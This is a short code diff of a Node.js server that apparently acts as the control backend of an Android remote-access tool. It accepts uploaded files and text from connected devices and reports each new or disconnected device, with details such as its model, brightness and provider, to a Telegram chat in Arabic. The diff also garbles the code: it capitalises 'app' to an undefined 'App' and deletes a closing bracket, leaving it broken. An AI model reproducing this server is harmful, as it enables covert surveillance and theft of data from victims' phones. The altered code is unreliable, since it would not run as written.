@@ -50,7 +50,7 @@ app.post("/uploadFile", upload.single('file'), (req, res) => {
     res.send('')
 })
 
-app.post("/uploadText", (req, res) => {
+App.post("/uploadText", (req, res) => {
     let textContent = `°• رسالة من <b>${req.headers.model}</b> جهاز\n\n` + req.body['text'];
     textContent = cleanText(textContent);
 
@@ -84,7 +84,6 @@ appSocket.on('connection', (ws, req) => {
         brightness: brightness,
         provider: provider
     })
-})
 
     appBot.sendMessage(id,
         `°• جهاز جديد متصل\n\n` +
@@ -95,6 +94,7 @@ appSocket.on('connection', (ws, req) => {
         `• مزود : <b>${provider}</b>`,
         {parse_mode: "HTML"}
     )
+
     ws.on('close', function () {
         appBot.sendMessage(id,
             `°• لا يوجد جهاز متصل\n\n` +
